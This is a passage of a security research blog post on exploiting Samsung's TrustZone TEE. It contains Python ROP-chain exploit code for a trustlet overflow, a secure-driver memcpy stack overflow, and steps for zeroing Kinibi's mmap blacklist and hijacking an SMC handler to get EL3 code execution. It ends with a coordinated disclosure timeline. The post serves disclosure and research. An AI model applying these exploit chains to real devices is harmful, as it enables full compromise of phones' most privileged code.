class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x07d01013</span><span class=\"p\">]</span>\n\n    <span class=\"c1\"># 0x07d01012 (0x07d01013): mov r12, r0; pop.w {r0-r4, lr}; bx r12;</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"n\">tlApi_callDriver_id</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"n\">driver_id</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"n\">payload_address</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x0</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"n\">retval_address</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x07d0244d</span><span class=\"p\">]</span>\n\n    <span class=\"c1\"># 0x07d0244c (0x07d0244d): str r0, [r4]; pop {r4, pc};</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x2079D</span><span class=\"p\">]</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">ropchain</span>\n</pre> \n   </div> \n   <p>The second step is to create the IPC structure that will hold the data passed to the secure driver. In the specific example given below, it will only hold an invalid command ID which will result in a log message containing the said command ID. However, the same method can be used to reach any command provided by the secure driver.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"c1\"># TCI buffer address in the trustlet address space</span>\n<span class=\"n\">TCI_BUFFER_ADDRESS</span> <span class=\"o\">=</span> <span class=\"mh\">0x100000</span>\n\n<span class=\"c1\"># Secure driver ID to communicate with using IPCs</span>\n<span class=\"n\">dr_id</span> <span class=\"o\">=</span> <span class=\"mh\">0x40002</span>\n\n<span class=\"c1\"># Offset in the TCI buffer to store the return value of `tlApi_CallDriver`</span>\n<span class=\"n\">dr_retval_offset</span> <span class=\"o\">=</span> <span class=\"mh\">0x90</span>\n<span class=\"c1\"># Corresponding address for the previous offset</span>\n<span class=\"n\">dr_retval_addr</span> <span class=\"o\">=</span> <span class=\"n\">TCI_BUFFER_ADDRESS</span> <span class=\"o\">+</span> <span class=\"n\">dr_retval_offset</span>\n\n<span class=\"c1\"># Offset in the TCI buffer holding the IPC structure</span>\n<span class=\"n\">dr_payload_offset</span> <span class=\"o\">=</span> <span class=\"mh\">0x200</span>\n<span class=\"c1\"># Corresponding address for the previous offset</span>\n<span class=\"n\">dr_payload_addr</span> <span class=\"o\">=</span> <span class=\"n\">TCI_BUFFER_ADDRESS</span> <span class=\"o\">+</span> <span class=\"n\">dr_payload_offset</span>\n\n<span class=\"c1\"># Arbitrary value that will be written in the logs if the exploitation and</span>\n<span class=\"c1\"># communication with the secure driver goes as expected.</span>\n<span class=\"n\">dr_command_id</span> <span class=\"o\">=</span> <span class=\"mh\">0xba0bab</span>\n\n<span class=\"c1\"># Address in the McLib of the tlApi handler</span>\n<span class=\"n\">tlapi_handler</span> <span class=\"o\">=</span> <span class=\"mh\">0x7d01008</span>\n\n<span class=\"k\">with</span> <span class=\"n\">TrustletInterface</span><span class=\"p\">()</span> <span class=\"k\">as</span> <span class=\"n\">tl_if</span><span class=\"p\">:</span>\n  <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Setting up the payload to send to the secure driver\"</span><span class=\"p\">)</span>\n  <span class=\"n\">payload_chunk</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n          <span class=\"mh\">0xdeadbeef</span><span class=\"p\">,</span>\n          <span class=\"n\">dr_command_id</span><span class=\"p\">,</span>   <span class=\"c1\"># The value that should appear in the logs</span>\n          <span class=\"mh\">0x00</span><span class=\"p\">,</span>\n          <span class=\"mh\">0x00</span><span class=\"p\">,</span>\n  <span class=\"p\">]</span>\n  <span class=\"n\">tl_if</span><span class=\"o\">.</span><span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">seek</span><span class=\"p\">(</span><span class=\"n\">dr_payload_offset</span><span class=\"p\">)</span>\n  <span class=\"k\">for</span> <span class=\"n\">dword</span> <span class=\"ow\">in</span> <span class=\"n\">payload_chunk</span><span class=\"p\">:</span>\n      <span class=\"n\">tl_if</span><span class=\"o\">.</span><span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">write_dword</span><span class=\"p\">(</span><span class=\"n\">dword</span><span class=\"p\">)</span>\n\n  <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Starting the buffer overflow exploit\"</span><span class=\"p\">)</span>\n  <span class=\"n\">tl_if</span><span class=\"o\">.</span><span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">seek</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n  <span class=\"n\">tl_if</span><span class=\"o\">.</span><span class=\"n\">buffer_overflow_exploit</span><span class=\"p\">(</span>\n      <span class=\"n\">RopChain</span><span class=\"o\">.</span><span class=\"n\">call_driver</span><span class=\"p\">(</span>\n          <span class=\"n\">dr_id</span><span class=\"p\">,</span>\n          <span class=\"n\">dr_payload_addr</span><span class=\"p\">,</span>\n          <span class=\"n\">dr_retval_addr</span><span class=\"p\">,</span>\n          <span class=\"n\">tlapi_handler</span><span class=\"p\">),</span>\n      <span class=\"n\">RopChain</span><span class=\"o\">.</span><span class=\"n\">call_notify_and_wait</span><span class=\"p\">()</span>\n  <span class=\"p\">)</span>\n  <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Exploit completed\"</span><span class=\"p\">)</span>\n</pre> \n   </div> \n   <p>And the result is the following, proving the communication was successful:</p> \n   <div class=\"highlight\"> \n    <pre><span></span>Trustonic TEE: 802|VALIDATOR [WARN ]: SPID - 0xba0bab [ERROR]: Sec Driver::drACProvisioning(): disabled\n</pre> \n   </div> \n   <p>The next section explains how this communication channel can be leveraged to gain code execution in a secure driver, getting us a step closer to code execution in EL3.</p> \n  </div> \n </div> \n</div> \n<div class=\"section\" id=\"getting-code-execution-in-a-secure-driver\"> \n <h2>Getting Code Execution in a Secure Driver</h2> \n <div class=\"section\" id=\"secure-driver-vulnerability-analysis\"> \n  <h3>Secure Driver - Vulnerability Analysis</h3> \n  <p>The second stage of the exploit is to get code execution into a secure driver to perform more privileged operations. We've seen that, using code execution in a trustlet, it is possible to communicate with a secure driver using IPC. However, it is not always possible, despite being able to execute code in S-EL0. Most trustlets do not need to communicate, if at all, with every secure driver to function properly. Therefore, to reduce the attack surface, whitelists are used to prevent unauthorized trustlets from communicating with secure drivers. Thankfully for us, not all secure drivers implement this mechanism and it was then possible to reach the targeted secure driver directly from the SEM trustlet.</p> \n  <p>This secure driver seems to be called <tt class=\"docutils literal\">VALIDATOR</tt> and the binary used in this article can be downloaded here: <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/ffffffffd00000000000000000000004.tlbin\">ffffffffd00000000000000000000004.tlbin</a>.</p> \n  <ul class=\"simple\"> \n   <li><strong>Driver ID:</strong> <tt class=\"docutils literal\">ffffffffd00000000000000000000004</tt></li> \n   <li><strong>MD5:</strong> <tt class=\"docutils literal\">7d0c998f48d98eb428fcbe3e3e2bbc21</tt></li> \n  </ul> \n  <p>The first step when reverse engineering a secure driver is to locate the function redirecting the input to the appropriate command handlers. This is usually done by looking for the IPC handling code.</p> \n  <p>In our case, the IPC handling is done by the main thread, in the function <tt class=\"docutils literal\">drMain</tt> at address <tt class=\"docutils literal\">0xC682</tt>. Once the address of the input buffer sent by the trustlet via IPC has been received using <tt class=\"docutils literal\">drApiIpcCallToIPCH</tt>, the whole trustlet address space is mapped into the address space of the driver and the input buffer address is translated, using a single call to <tt class=\"docutils literal\">drApiMapClientAndParams</tt>. The input data is then dispatched to the correct handler based on the command ID field of the input buffer.</p> \n  <p>The command handler discussed in the rest of this section is the 15<sup>th</sup>. As explained previously, some command handlers check that the calling trustlet is authorized to execute this function. This handler does not.</p> \n  <p>The handler starts by retrieving a pointer located at <tt class=\"docutils literal\">*(mapped_buffer+0x8)</tt> where <tt class=\"docutils literal\">mapped_buffer</tt> is the mapped input buffer. The handler then calls <tt class=\"docutils literal\">drApiAddrTranslateAndCheck</tt> which ensures that it points to memory from the trustlet address space and translate it to the driver address space. We will call this second buffer <tt class=\"docutils literal\">second_mapped_buffer</tt> in the rest of this section. At this point, if everything went as expected, the attacker-controlled buffer is mapped and referenced by the driver and ready to be used by the rest of the handler.</p> \n  <p>A full explanation of the handler being unnecessary to understand the vulnerability, only the interesting part is given in the snippet below.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"mh\">0x0136C</span><span class=\"o\">:</span>    <span class=\"n\">MOV</span>       <span class=\"n\">R2</span><span class=\"p\">,</span> <span class=\"n\">R5</span>        <span class=\"p\">;</span> <span class=\"n\">R2</span> <span class=\"o\">&lt;-</span> <span class=\"n\">len</span> <span class=\"o\">=</span> <span class=\"o\">*</span><span class=\"p\">(</span><span class=\"n\">second_mapped_buffer</span><span class=\"o\">+</span><span class=\"mh\">0x200</span><span class=\"p\">)</span>\n<span class=\"mh\">0x0136E</span><span class=\"o\">:</span>    <span class=\"n\">MOV</span>       <span class=\"n\">R1</span><span class=\"p\">,</span> <span class=\"n\">R8</span>        <span class=\"p\">;</span> <span class=\"n\">R1</span> <span class=\"o\">&lt;-</span> <span class=\"n\">src</span> <span class=\"o\">=</span> <span class=\"n\">second_mapped_buffer</span><span class=\"o\">+</span><span class=\"mh\">0x100</span>\n<span class=\"mh\">0x01370</span><span class=\"o\">:</span>    <span class=\"n\">ADD</span>       <span class=\"n\">R0</span><span class=\"p\">,</span> <span class=\"n\">SP</span><span class=\"p\">,</span> <span class=\"err\">#</span><span class=\"mh\">0x38</span> <span class=\"p\">;</span> <span class=\"n\">R0</span> <span class=\"o\">&lt;-</span> <span class=\"n\">dst</span> <span class=\"o\">=</span> <span class=\"n\">SP</span> <span class=\"o\">+</span> <span class=\"mh\">0x38</span>\n<span class=\"mh\">0x01372</span><span class=\"o\">:</span>    <span class=\"n\">BLX</span>       <span class=\"n\">memcpy</span>\n</pre> \n  </div> \n  <p>Once again, a buffer is copied into the stack and an attacker has full control over both the source and the length of the copied data. The exploitation process is similar to the one presented in the section <a class=\"reference internal\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#sec-trustlet-exploitation\">Getting Code Execution in a Trusted Application</a>, since the same software mitigations apply.</p> \n  <p>A representation of the stack frame of the vulnerable function is given below:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/secure_driver_vuln_memcpy_s7.png\" style=\"width: 370.5px; height: 390.5px;\" /> \n  <p>The exploitation of this vulnerability allows an attacker to reach more privileged syscalls made available by Kinibi to secure drivers. In the following section, the focus will be put on the one responsible for memory management, namely <tt class=\"docutils literal\">mmap</tt> (or at least its equivalent in Kinibi).</p> \n </div> \n <div class=\"section\" id=\"secure-driver-exploitation\"> \n  <h3>Secure Driver - Exploitation</h3> \n  <div class=\"section\" id=\"simple-proof-of-concept\"> \n   <h4>Simple Proof of Concept</h4> \n   <p>The most difficult part while exploiting this vulnerability is to craft the appropriate structures and make them reference each other correctly. Other than that, it remains a classical stack-based buffer overflow exploit.</p> \n   <p>Another noteworthy detail, is the size restriction for the exploit. During the construction of the ropchain, we realized that it was not possible to craft one with more than <tt class=\"docutils literal\">0x508</tt> bytes without making the secure driver crash. We did not analyze the root cause of this limitation, but it has never been an issue and can most likely be ignored in most cases. But keep it in mind if you need to write long ropchains for this specific vulnerability.</p> \n   <p>Just to demonstrate that code execution is actually possible, let's look at a simple exploit leaking the value at the offset <tt class=\"docutils literal\">0x1028</tt> containing the ID of the secure driver.</p> \n   <p>The whole exploit can be found here: <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/secdriver.py\">secdriver.py</a>.</p> \n   <p>Launching it on the phone give us the following output in <tt class=\"docutils literal\">dmesg</tt>, with <tt class=\"docutils literal\">0x40002</tt> being the secure driver ID:</p> \n   <div class=\"highlight\"> \n    <pre><span></span>Trustonic TEE: 802|VALIDATOR [WARN ]: SPID - 0x40002 [ERROR]: Sec Driver::drACProvisioning(): disabled\n</pre> \n   </div> \n  </div> \n  <div class=\"section\" id=\"making-syscalls-from-the-secure-driver\"> \n   <h4>Making Syscalls from the Secure Driver</h4> \n   <p>At this point, it is possible to execute arbitrary code in the secure driver. The next step would be to attack Kinibi using our newfound privileges. To do so, a possible attack vector would be the syscalls provided by Kinibi. The rest of this section explains how to make a syscall from a secure driver.</p> \n   <p>Syscalls are made using the instruction <tt class=\"docutils literal\">SVC</tt>. There are different conventions for system calls in ARM. You can have, for instance, the syscall number stored in the register <tt class=\"docutils literal\">R7</tt>, the arguments in other GPRs, followed by an instruction <tt class=\"docutils literal\">SVC #0</tt>. However, Kinibi uses another convention. Here the syscall number is directly encoded into the instruction (e.g. <tt class=\"docutils literal\">SVC #2</tt>, will call the second syscall). It limits our choices in potential gadgets since some syscalls are only used by RTM which is not mapped in the address spaces of trustlets and secure drivers.</p> \n   <p>The syscall-calling payloads implemented in <tt class=\"docutils literal\">SecDriverPayload</tt> are:</p> \n   <ul class=\"simple\"> \n    <li><tt class=\"docutils literal\">mmap (SVC #0x7)</tt>: maps physical secure and non-secure memory;</li> \n    <li><tt class=\"docutils literal\">munmap (SVC #0x8)</tt>: unmaps physical secure and non-secure memory;</li> \n    <li><tt class=\"docutils literal\">smc (SVC #0x1B)</tt>: makes secure monitor calls.</li> \n   </ul> \n   <p>These syscalls can only be reached from a secure driver and will be used in the next section.</p> \n  </div> \n </div> \n</div> \n<div class=\"section\" id=\"abusing-memory-mappings-to-reach-s-el1-and-el3\"> \n <h2>Abusing Memory Mappings to Reach S-EL1 and EL3</h2> \n <div class=\"section\" id=\"kinibi-vulnerability-analysis\"> \n  <span id=\"sec-kinibi-vuln-analysis\"></span> \n  <h3>Kinibi - Vulnerability Analysis</h3> \n  <p>Kinibi, as most operating systems does, provides system calls to applications so they can access privileged resources under its supervision. Some syscalls are only available to specific components. For instance, the <em>Runtime Manager</em>, or RTM, can create and start processes, however, secure drivers and trustlets cannot. These privileges are set during the creation of a new process.</p> \n  <p>Syscalls are usually the first piece of code targeted when a vulnerability allowing privilege escalation needs to be found. If the operating system does not correctly check the given arguments, it could lead to some unexpected behavior, such as unauthorised access to other components, memory corruption, etc. All of which are critical since they could allow an attacker to compromise the entire system.</p> \n  <p>In this section, the target will be Kinibi SVC handlers, and more precisely the <tt class=\"docutils literal\">mmap</tt> syscall. Kinibi is extracted from the <tt class=\"docutils literal\">sboot.bin</tt> binary using the IDA Kinibi loader plugin. The MD5 of the exploited <tt class=\"docutils literal\">sboot.bin</tt> binary is <tt class=\"docutils literal\">0d2dffc4ec3aa2580cd2b92841ecbd22</tt>. It can be downloaded here: <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/sboot.bin\">sboot.bin</a>.</p> \n  <p><tt class=\"docutils literal\">mmap</tt> cannot be reached by regular trusted applications, only by secure drivers. It allows mapping physical memory pages to the address space of the calling process. Under the hood, it creates page table entries and formats them to store information such as RWX rights, secure state, etc. These entries are then stored into Kinibi translation tables to be used later on.</p> \n  <p><tt class=\"docutils literal\">mmap</tt> can be found at address <tt class=\"docutils literal\">0x7F01DC4</tt>. The arguments passed to this system call are detailed below.</p> \n  <ul class=\"simple\"> \n   <li><strong>First argument (R0):</strong> the permissions to apply on the memory page.</li> \n   <li><strong>Second argument (R1):</strong> the virtual start address of the mapped memory region.</li> \n   <li><strong>Third argument (R2):</strong> the virtual end address of the mapped memory region.</li> \n   <li><strong>Fourth argument (R3):</strong> the 32 lowest bits of the 64-bit physical start address.</li> \n   <li><strong>Fifth argument (R4):</strong> the 32 highest bits of the 64-bit physical start address.</li> \n  </ul> \n  <p>After reverse engineering this function, different conclusions can be drawn. First of all, any Normal World address can be mapped. This has legitimate use cases, such as watching over the rich OS to verify that no corruption occurred and thus prevent an attacker from elevating their privileges. However, reaching code execution in a secure driver could be leveraged to perform a privilege escalation in the Normal World without finding a kernel vulnerability first.</p> \n  <p>In the case of the secure memory, being able to map and change physical pages arbitrarily can easily lead to code execution in Kinibi, and then in EL3. To prevent this from happening, a verification is performed on the secure physical addresses that the calling process is trying to map. It is implemented in the function located at address <tt class=\"docutils literal\">0x7F04FF2</tt>. This function is a simple wrapper around the one at address <tt class=\"docutils literal\">0x7F06262</tt> that was arbitrarily called <tt class=\"docutils literal\">is_physical_address_blacklisted</tt>. As its name suggests, this function takes as argument the physical address that the client is trying to map and makes sure that it is not included in a blacklist embedded inside Kinibi. This blacklist is given below.</p> \n  <div class=\"highlight\"> \n   <pre><span></span>Entry 0x00: 0x00000000 - 0x02022fff\nEntry 0x01: 0x02025000 - 0x0fffffff\nEntry 0x02: 0x10100000 - 0x10100fff\nEntry 0x03: 0x105c0000 - 0x105c0fff\nEntry 0x04: 0xf0000000 - 0xf7ffffff\nEntry 0x05: 0x1000000000 - 0xffffffffffffefff\n</pre> \n  </div> \n  <p>In older versions of Kinibi, it was possible to map the monitor and then directly get code execution in EL3. This was the vulnerability presented during BlackHat USA 2019 <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#bh2019\" id=\"id3\">[BH2019]</a>. The version of Kinibi that was exploited did not include this blacklist. Upstream stock versions of Android include this patch though. The secure monitor is mapped at address <tt class=\"docutils literal\">0x2022000</tt>, which is included in the blacklist. However, even with this blacklist, it was still possible to map Kinibi itself, which is located at physical address <tt class=\"docutils literal\">0xfe500000</tt>.</p> \n  <p>It is now possible to map and modify Kinibi to reach code execution in S-EL1. As explained in the first article of this series, there is currently no S-EL2, which means that S-EL1 has access to the entire secure memory region. Therefore, it is possible to get code execution in EL3 by modifying the code of the secure monitor from Kinibi.</p> \n  <p>Note: This vulnerability was identified as <tt class=\"docutils literal\"><span class=\"pre\">SVE-2019-16665</span></tt> and patched in Samsung's <a class=\"reference external\" href=\"https://security.samsungmobile.com/securityUpdate.smsb\">Security Maintenance Release of June 2020</a></p> \n </div> \n <div class=\"section\" id=\"kinibi-exploitation\"> \n  <h3>Kinibi - Exploitation</h3> \n  <p>The exploit presented in this section is pretty basic. The idea is to simply demonstrate the ability to execute arbitrary code in EL3. To do so, we will take a SMC handler from the Secure Monitor, map its code using the vulnerability in mmap, modify it and then call it from the secure driver we control.</p> \n  <div class=\"section\" id=\"bypassing-the-blacklist\"> \n   <h4>Bypassing the Blacklist</h4> \n   <p>The main issue is that mapping the monitor is prohibited, because of the blacklist introduced in the previous section. The first step is to get rid of it by simply zeroing it out, which can be achieved using the vulnerability previously discussed.</p> \n   <p>The blacklist can be found at address <tt class=\"docutils literal\">0xfe512440</tt>. The memory page <tt class=\"docutils literal\">0xfe512000</tt> can be mapped using <tt class=\"docutils literal\">SecDriverPayload.svc_mmap</tt> and then filled with zeroes using <tt class=\"docutils literal\">SecDriverPayload.memcpy</tt>. After that, the blacklist is empty and any physical memory page can be mapped using <tt class=\"docutils literal\">mmap</tt>.</p> \n  </div> \n  <div class=\"section\" id=\"smc-handler-hijacking\"> \n   <h4>SMC Handler Hijacking</h4> \n   <p>Now that we can modify anything we want in memory, the first step is to identify which SMC handler to hijack in the <tt class=\"docutils literal\">sboot.bin</tt> binary given in <a class=\"reference internal\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#sec-kinibi-vuln-analysis\">a previous section</a>. The one at address <tt class=\"docutils literal\">0x2030524</tt> is an adequate candidate. From our experience, changing the code of this SMC handler does not have a significant impact on the stability of the system. This SMC can be called from a secure driver using the ID <tt class=\"docutils literal\">0x820000F2</tt>.</p> \n   <p>The second step is to map the code of this SMC handler using <tt class=\"docutils literal\">mmap</tt> and modify it by replacing its first instructions by:</p> \n   <div class=\"highlight\"> \n    <pre><span></span>MRS X0, CurrentEL\nRET\n</pre> \n   </div> \n   <p>Now, if this SMC is called, it will return the current Exception Level the CPU is running at. To make an SMC from the secure driver, the method <tt class=\"docutils literal\">SecDriverPayload.svc_smc</tt> calls the drApi function <tt class=\"docutils literal\">drApiSMC</tt> and passes the address of a buffer containing the arguments to pass to it. The result of the SMC is written back into the input buffer.</p> \n   <p>For example, if we want to call the SMC <tt class=\"docutils literal\">0x820000F2</tt> with the arguments <tt class=\"docutils literal\">0x1234</tt> and <tt class=\"docutils literal\">0xdeadbeef</tt>, we would:</p> \n   <ul class=\"simple\"> \n    <li>write these values consecutively at an offset in the TCI buffer, e.g. <tt class=\"docutils literal\">0x1000</tt>;</li> \n    <li>pass the address 0x101000 to <tt class=\"docutils literal\">drApiSMC</tt> using the method <tt class=\"docutils literal\">svc_smc</tt>;</li> \n    <li>read back the result in the TCI buffer at the offset <tt class=\"docutils literal\">0x1000</tt>.</li> \n   </ul> \n   <p>In practice, running the exploit returns the value of the current EL shifted by two. Shifting it back yields the expected value:</p> \n   <asciinema-player src=\"resources/2020-06-30-samsung_trustzone_exploitation-part3/mon_exploit.cast\" cols=\"175\" rows=\"12\" font-size=\"small\"></asciinema-player> \n   <p>The full exploit can be found here: <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/teeos.py\">teeos.py</a>.</p> \n  </div> \n </div> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>This article showed that even though Samsung's TrustZone is used to protect the system, the overall increase in security is questionable. Simple vulnerabilities can be chained together to achieve code execution in the most privileged component of Samsung's TEE. The implementation of common software mitigations would greatly limit the impact of most vulnerabilities presented in this blog post.</p> \n <p>This was also an opportunity to highlight some of the shortcomings in current TrustZone implementations, but also in the development and verification process of secure components. Basic fuzzing methods yielded exploitable results very quickly, despite the only resource available being the secure components binaries. Vendors, which have access to the source code, to debug boards and other useful resources, could be way more effective at finding vulnerabilities.</p> \n <p>The embedded world is playing catch-up with its desktop counterpart and still has to get up to speed. While the vulnerabilities presented in this article are now patched, we believe there are many more still in the wild.</p> \n</div> \n<div class=\"section\" id=\"disclosure-timeline\"> \n <h2>Disclosure timeline</h2> \n <div class=\"section\" id=\"id4\"> \n  <h3>2019-05-10</h3> \n  <p>Samsung asks for details about upcoming presentation at BlackHat Briefings 2019 Las Vegas <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#bh2019\" id=\"id5\">[BH2019]</a>.</p> \n </div> \n <div class=\"section\" id=\"id6\"> \n  <h3>2019-05-16</h3> \n  <p>Samsung asks for details again.</p> \n </div> \n <div class=\"section\" id=\"id7\"> \n  <h3>2019-05-17</h3> \n  <p>Quarkslab replies that the talk will not disclose any new bugs.</p> \n </div> \n <div class=\"section\" id=\"id8\"> \n  <h3>2019-05-21</h3> \n  <p>Samsung requests the slides of the talk in case they may have missed anything.</p> \n </div> \n <div class=\"section\" id=\"id9\"> \n  <h3>2019-05-27</h3> \n  <p>Samsung asks for the slides again.</p> \n </div> \n <div class=\"section\" id=\"id10\"> \n  <h3>2019-05-30</h3> \n  <p>Quarkslab replies that slides are not ready but will be provided prior to the talk. The list of known bugs that will be used is sent, along with corresponding technical details.</p> \n </div> \n <div class=\"section\" id=\"id11\"> \n  <h3>2019-05-31</h3> \n  <p>Samsung acknowledges prior email and asks Quarkslab to double check information about command handler #15 in binary <tt class=\"docutils literal\">ffffffffd00000000000000000000004.tlbin</tt></p> \n </div> \n <div class=\"section\" id=\"id12\"> \n  <h3>2019-06-11</h3> \n  <p>Samsung asks for confirmation of details from prior email.</p> \n </div> \n <div class=\"section\" id=\"id13\"> \n  <h3>2019-07-11</h3> \n  <p>Samsung asks again for confirmation asked in prior email.</p> \n </div> \n <div class=\"section\" id=\"id14\"> \n  <h3>2019-07-15</h3> \n  <p>Quarkslab confirms that the information provided on 2019-05-30 is accurate and sends the white paper submitted to BlackHat's program committee for the talk. It is not the final version but it is sufficiently detailed and complete to understand what will be presented.</p> \n </div> \n <div class=\"section\" id=\"id15\"> \n  <h3>2019-07-23</h3> \n  <p>Quarkslab notifies Samsung that while preparing the talk for BlackHat the presenters discovered a new vulnerability that allows to map and modify Kinibi to achieve code execution in S-EL1. This new vulnerability will not be disclosed at the BlackHat presentation.</p> \n </div> \n <div class=\"section\" id=\"id16\"> \n  <h3>2019-07-26</h3> \n  <p>Samsung acknowledges the prior report and says it will analyze the new vulnerability, asks for clarifications about other bugs mentioned in prior emails.</p> \n </div> \n <div class=\"section\" id=\"id17\"> \n  <h3>2019-07-26</h3> \n  <p>Quarkslab replies with details about bug in SEM TA on S6 devices and asks if a similar buffer overflow in handler #12 is also fixed.</p> \n </div> \n <div class=\"section\" id=\"id18\"> \n  <h3>2019-10-01</h3> \n  <p>Samsung replies that command handlers #5 and #7 were fixed in S6 and S7 devices.</p> \n </div> \n <div class=\"section\" id=\"id19\"> \n  <h3>2019-10-08</h3> \n  <p>Quarkslab confirms bugs in command handlers are fixed in current S6 and S7. Asks for the status of the mmap vulnerability reported on July 23.</p> \n </div> \n <div class=\"section\" id=\"id20\"> \n  <h3>2019-10-14</h3> \n  <p>Samsung says it finished analyzing the vulnerability and started working with stakeholders to fix it. The bug affects several versions of Kinibi. They ask Quarkslab to withhold disclosure of the vulnerability until adequate remedy is in place \"<em>in order to reduce risk to the end consumers</em>\".</p> \n </div> \n <div class=\"section\" id=\"id21\"> \n  <h3>2019-10-14</h3> \n  <p>Quarkslab replies that, in order to evaluate the request to withhold disclosure, more information should be provided by Samsung. Quarkslab asks for answers to the following questions:</p> \n  <ul class=\"simple\"> \n   <li>What are the vulnerable models and versions?</li> \n   <li>What is the estimated date for the fix?</li> \n   <li>What is the severity rating given to the vulnerability?</li> \n   <li>Did Samsung assigned a CVE or other unique identifier to the vuln?</li> \n   <li>Does Samsung plan to publish a security advisory, bulletin or technical note disclosing the problem?</li> \n  </ul> \n  <p>Additionally, Quarkslab says that users are currently at risk and what puts them in that situation is the existence of the vulnerability, not the availability of public information about it. The purpose of disclosing information is to inform vulnerable users so they can take appropriate measures to mitigate or avoid risk.</p> \n </div> \n <div class=\"section\" id=\"id22\"> \n  <h3>2019-11-01</h3> \n  <p>Samsung replies that they are working with the chipset vendor on a fix but it is taking \"<em>longer than expected</em>\". The vulnerability was assigned ID <tt class=\"docutils literal\"><span class=\"pre\">SVE-2019-16030</span></tt> and is rated as Critical. A CVE should be requested by Quarkslab from MITRE. A better date estimate will be provided after the patches are prepared. Patches will be made available at the <a class=\"reference external\" href=\"https://security.samsungmobile.com/securityUpdate.smsb\">Android Security updates site</a>.</p> \n </div> \n <div class=\"section\" id=\"id23\"> \n  <h3>2019-11-27</h3> \n  <p>Quarkslab asks for the release date planned for <tt class=\"docutils literal\"><span class=\"pre\">SVE-2019-16030</span></tt> and says it is planning to publish a series of blog posts disclosing the research presented at BlackHat Briefings 2019 Las Vegas <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#bh2019\" id=\"id24\">[BH2019]</a> and would like to include fix information.</p> \n </div> \n <div class=\"section\" id=\"id25\"> \n  <h3>2019-12-06</h3> \n  <p>Samsung says that getting patches form the chipset vendor for all Kinibi versions took more time than expected and that more regression and QA testing is needed. Asks Quarkslab to omit <tt class=\"docutils literal\"><span class=\"pre\">SVE-2019-16030</span></tt> from the blog posts and says that patches will be ready in February 2020.</p> \n </div> \n <div class=\"section\" id=\"id26\"> \n  <h3>2019-12-09</h3> \n  <p>Quarkslab internally agrees to postpone publication of the vulnerability in the blog post series.</p> \n </div> \n <div class=\"section\" id=\"id27\"> \n  <h3>2019-12-10</h3> \n  <p>Quarkslab notifies Samsung that it agrees to postpone publication of details about the bug. It plans to publish them at the end of February 2020. That date should be considered final.</p> \n </div> \n <div class=\"section\" id=\"id28\"> \n  <h3>2019-12-12</h3> \n  <p>Samsung acknowledges last email and thanks Quarkslab.</p> \n </div> \n <div class=\"section\" id=\"id29\"> \n  <h3>2020-03-02</h3> \n  <p>Quarkslab asks if the patches were released, also if the vulnerability is eligible for Samsung bug bounties.</p> \n </div> \n <div class=\"section\" id=\"id30\"> \n  <h3>2020-03-03</h3> \n  <p>Samsung says it assigned ID <tt class=\"docutils literal\"><span class=\"pre\">SVE-2019-16665</span></tt> to the vulnerability. Patches for Exynos 9810 were released in February. patches for Exynos 7885 and 8895 will be released in April 2020. The bug is eligible for a bug bounty which should be filed separately at Samsung's <a class=\"reference external\" href=\"https://security.samsungmobile.com/securityReporting.smsb\">security reporting site</a>.</p> \n </div> \n <div class=\"section\" id=\"id31\"> \n  <h3>2020-03-13</h3> \n  <p>Quarkslab asks Samsung to credit Quarkslab's engineers in their security bulletin.</p> \n </div> \n <div class=\"section\" id=\"id32\"> \n  <h3>2020-03-15</h3> \n  <p>Samsung replies that it added credits to Quarkslab's engineers.</p> \n </div> \n <div class=\"section\" id=\"id33\"> \n  <h3>2020-06-01</h3> \n  <p>Samsung published patches for the Exynos 7570 chipset.</p> \n </div> \n <div class=\"section\" id=\"id34\"> \n  <h3>2020-07-02</h3> \n  <p>Blog post is published.</p> \n </div> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils citation\" frame=\"void\" id=\"trust-issues\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> 